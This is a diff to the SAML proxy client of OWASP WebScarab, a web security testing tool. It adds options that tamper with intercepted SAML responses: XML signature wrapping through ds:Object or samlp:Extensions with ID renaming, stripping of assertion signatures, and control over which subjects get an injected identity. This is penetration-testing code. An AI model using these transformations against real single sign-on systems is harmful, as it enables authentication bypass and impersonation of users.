@@ -1,32 +1,32 @@
-/***********************************************************************
+/**
+ * *********************************************************************
  *
  * $CVSHeader$
  *
- * This file is part of WebScarab, an Open Web Application Security
- * Project utility. For details, please see http://www.owasp.org/
+ * This file is part of WebScarab, an Open Web Application Security Project
+ * utility. For details, please see http://www.owasp.org/
  *
- * Copyright (c) 2010 FedICT
- * Copyright (c) 2010 Frank Cornelis <info@frankcornelis.be>
+ * Copyright (c) 2010 FedICT Copyright (c) 2010 Frank Cornelis
+ * <info@frankcornelis.be>
  *
- * This program is free software; you can redistribute it and/or
- * modify it under the terms of the GNU General Public License
- * as published by the Free Software Foundation; either version 2
- * of the License, or (at your option) any later version.
+ * This program is free software; you can redistribute it and/or modify it under
+ * the terms of the GNU General Public License as published by the Free Software
+ * Foundation; either version 2 of the License, or (at your option) any later
+ * version.
  *
- * This program is distributed in the hope that it will be useful,
- * but WITHOUT ANY WARRANTY; without even the implied warranty of
- * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
- * GNU General Public License for more details.
+ * This program is distributed in the hope that it will be useful, but WITHOUT
+ * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
+ * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
+ * details.
  *
- * You should have received a copy of the GNU General Public License
- * along with this program; if not, write to the Free Software
- * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
+ * You should have received a copy of the GNU General Public License along with
+ * this program; if not, write to the Free Software Foundation, Inc., 59 Temple
+ * Place - Suite 330, Boston, MA 02111-1307, USA.
  *
- * Getting Source
- * ==============
+ * Getting Source ==============
  *
- * Source for this application is maintained at Sourceforge.net, a
- * repository for free software projects.
+ * Source for this application is maintained at Sourceforge.net, a repository
+ * for free software projects.
  *
  * For details, please see http://www.sourceforge.net/projects/owasp
  *
@@ -40,6 +40,8 @@ import java.security.KeyStore;
 import java.security.PrivateKey;
 import java.security.cert.Certificate;
 import java.security.cert.X509Certificate;
+import java.util.LinkedList;
+import java.util.List;
 import java.util.logging.Level;
 import java.util.logging.Logger;
 import javax.xml.parsers.DocumentBuilder;
@@ -66,6 +68,7 @@ import org.owasp.webscarab.model.NamedValue;
 import org.owasp.webscarab.model.Request;
 import org.owasp.webscarab.model.Response;
 import org.owasp.webscarab.util.Encoding;
+import org.w3c.dom.Attr;
 import org.w3c.dom.Document;
 import org.w3c.dom.Element;
 import org.w3c.dom.NodeList;
@@ -86,6 +89,7 @@ public class SamlHTTPClient implements HTTPClient {
         this.samlProxyConfig = samlProxyConfig;
     }
 
+    @Override
     public Response fetchResponse(Request request) throws IOException {
         /*
          * We want a very fast fall-through in case nothing needs to be done.
@@ -146,6 +150,12 @@ public class SamlHTTPClient implements HTTPClient {
                     samlProxyHeader += "replayed;";
                 }
 
+                if (this.samlProxyConfig.doSignWrapAttack()) {
+                    String newSamlResponse = signatureWrapping(namedValues[idx].getValue());
+                    namedValues[idx] = new NamedValue(namedValues[idx].getName(), newSamlResponse);
+                    samlProxyHeader += "signature wrapping;";
+                }
+
                 if (this.samlProxyConfig.doInjectAttribute()) {
                     String newSamlResponse = injectAttribute(namedValues[idx].getValue());
                     namedValues[idx] = new NamedValue(namedValues[idx].getName(), newSamlResponse);
@@ -160,6 +170,11 @@ public class SamlHTTPClient implements HTTPClient {
                     String newSamlResponse = injectPublicDoctype(namedValues[idx].getValue());
                     namedValues[idx] = new NamedValue(namedValues[idx].getName(), newSamlResponse);
                     samlProxyHeader += "injected public doctype;";
+                }
+                if (this.samlProxyConfig.doRemoveAssertionSignature()) {
+                    String newSamlResponse = removeSamlAssertionSignature(namedValues[idx].getValue());
+                    namedValues[idx] = new NamedValue(namedValues[idx].getName(), newSamlResponse);
+                    samlProxyHeader += "removed assertion signature;";
                 }
 
                 if (this.samlProxyConfig.doSignSamlMessage()) {
@@ -191,7 +206,7 @@ public class SamlHTTPClient implements HTTPClient {
             return;
         }
 
-        StringBuffer newBody = new StringBuffer();
+        StringBuilder newBody = new StringBuilder();
         for (int idx = 0; idx < namedValues.length; idx++) {
             NamedValue namedValue = namedValues[idx];
             if (0 != newBody.length()) {
@@ -356,8 +371,25 @@ public class SamlHTTPClient implements HTTPClient {
 
         String injectionSubject = this.samlProxyConfig.getInjectionSubject();
 
+        Occurences subjectOccurences = this.samlProxyConfig.getSubjectOccurences();
+
         NodeList subjectNodeList = document.getElementsByTagNameNS("urn:oasis:names:tc:SAML:1.0:assertion", "Subject");
+        saml1:
         for (int subjectIdx = 0; subjectIdx < subjectNodeList.getLength(); subjectIdx++) {
+            switch (subjectOccurences) {
+                case ALL:
+                    break;
+                case FIRST:
+                    if (subjectIdx != 0) {
+                        break saml1;
+                    }
+                    break;
+                case LAST:
+                    if (subjectIdx != subjectNodeList.getLength() - 1) {
+                        continue saml1;
+                    }
+                    break;
+            }
             Element subjectElement = (Element) subjectNodeList.item(subjectIdx);
             NodeList nameIdentifierNodeList = subjectElement.getElementsByTagNameNS("urn:oasis:names:tc:SAML:1.0:assertion", "NameIdentifier");
             if (0 != nameIdentifierNodeList.getLength()) {
@@ -366,7 +398,22 @@ public class SamlHTTPClient implements HTTPClient {
         }
 
         NodeList subject2NodeList = document.getElementsByTagNameNS("urn:oasis:names:tc:SAML:2.0:assertion", "Subject");
+        saml2:
         for (int subjectIdx = 0; subjectIdx < subject2NodeList.getLength(); subjectIdx++) {
+            switch (subjectOccurences) {
+                case ALL:
+                    break;
+                case FIRST:
+                    if (subjectIdx != 0) {
+                        break saml2;
+                    }
+                    break;
+                case LAST:
+                    if (subjectIdx != subject2NodeList.getLength() - 1) {
+                        continue saml2;
+                    }
+                    break;
+            }
             Element subjectElement = (Element) subject2NodeList.item(subjectIdx);
             NodeList nameIDNodeList = subjectElement.getElementsByTagNameNS("urn:oasis:names:tc:SAML:2.0:assertion", "NameID");
             if (0 != nameIDNodeList.getLength()) {
@@ -415,5 +462,93 @@ public class SamlHTTPClient implements HTTPClient {
         xmlSignature.sign(privateKey);
 
         return outputDocument(document);
+    }
+
+    private String signatureWrapping(String samlResponse) throws IOException, ParserConfigurationException, SAXException, Base64DecodingException, TransformerConfigurationException, TransformerException {
+        Document document = parseDocument(samlResponse);
+
+        Wrapper wrapper = this.samlProxyConfig.getWrapper();
+        switch (wrapper) {
+            case DS_OBJECT: {
+                Element protocolSignatureElement = SamlModel.findProtocolSignatureElement(document);
+                if (null == protocolSignatureElement) {
+                    return samlResponse;
+                }
+                String dsPrefix = protocolSignatureElement.getPrefix();
+                String dsObjectQualifiedName;
+                if (null == dsPrefix) {
+                    dsObjectQualifiedName = "Object";
+                } else {
+                    dsObjectQualifiedName = dsPrefix + ":Object";
+                }
+                Element dsObjectElement = document.createElementNS("http://www.w3.org/2000/09/xmldsig#", dsObjectQualifiedName);
+                Element samlResponseElement = document.getDocumentElement();
+                Element importedSamlResponseElement = (Element) document.importNode(samlResponseElement, true);
+                dsObjectElement.appendChild(importedSamlResponseElement);
+                protocolSignatureElement.appendChild(dsObjectElement);
+            }
+            break;
+            case SAMLP_EXTENSIONS: {
+                Element samlResponseElement = document.getDocumentElement();
+                String samlpPrefix = samlResponseElement.getPrefix();
+                String samlpExtensionsQualifiedName;
+                if (null == samlpPrefix) {
+                    samlpExtensionsQualifiedName = "Extensions";
+                } else {
+                    samlpExtensionsQualifiedName = samlpPrefix + ":Extensions";
+                }
+                String samlpNamespace = samlResponseElement.getNamespaceURI();
+                Element samlpExtensionsElement = document.createElementNS(samlpNamespace, samlpExtensionsQualifiedName);
+                Element importedSamlResponseElement = (Element) document.importNode(samlResponseElement, true);
+                samlpExtensionsElement.appendChild(importedSamlResponseElement);
+                samlResponseElement.appendChild(samlpExtensionsElement);
+            }
+            break;
+        }
+
+        if (this.samlProxyConfig.doRenameTopId()) {
+            Element rootElement = document.getDocumentElement();
+            Attr idAttr = rootElement.getAttributeNode("ID");
+            String oldIdValue = idAttr.getValue();
+            String newIdValue = "renamed-" + oldIdValue;
+            idAttr.setValue(newIdValue);
+        }
+
+        return outputDocument(document);
+    }
+
+    private String removeSamlAssertionSignature(String samlResponse) throws IOException, ParserConfigurationException, SAXException, Base64DecodingException, TransformerConfigurationException, TransformerException {
+        Document document = parseDocument(samlResponse);
+        List<Element> assertionSignatureElements = findAssertionSignatures(document);
+        for (Element assertionSignatureElement : assertionSignatureElements) {
+            assertionSignatureElement.getParentNode().removeChild(assertionSignatureElement);
+        }
+        return outputDocument(document);
+    }
+
+    private List<Element> findAssertionSignatures(Document document) {
+        List<Element> assertionSignatures = new LinkedList<Element>();
+
+        NodeList saml2AssertionNodeList = document.getElementsByTagNameNS("urn:oasis:names:tc:SAML:2.0:assertion", "Assertion");
+        for (int assertionNodeIdx = 0; assertionNodeIdx < saml2AssertionNodeList.getLength(); assertionNodeIdx++) {
+            Element assertionElement = (Element) saml2AssertionNodeList.item(assertionNodeIdx);
+            NodeList signatureNodeList = assertionElement.getElementsByTagNameNS("http://www.w3.org/2000/09/xmldsig#", "Signature");
+            for (int signatureNodeIdx = 0; signatureNodeIdx < signatureNodeList.getLength(); signatureNodeIdx++) {
+                Element signatureElement = (Element) signatureNodeList.item(signatureNodeIdx);
+                assertionSignatures.add(signatureElement);
+            }
+        }
+
+        NodeList assertionNodeList = document.getElementsByTagNameNS("urn:oasis:names:tc:SAML:1.0:assertion", "Assertion");
+        for (int assertionNodeIdx = 0; assertionNodeIdx < assertionNodeList.getLength(); assertionNodeIdx++) {
+            Element assertionElement = (Element) assertionNodeList.item(assertionNodeIdx);
+            NodeList signatureNodeList = assertionElement.getElementsByTagNameNS("http://www.w3.org/2000/09/xmldsig#", "Signature");
+            for (int signatureNodeIdx = 0; signatureNodeIdx < signatureNodeList.getLength(); signatureNodeIdx++) {
+                Element signatureElement = (Element) signatureNodeList.item(signatureNodeIdx);
+                assertionSignatures.add(signatureElement);
+            }
+        }
+
+        return assertionSignatures;
     }
 }
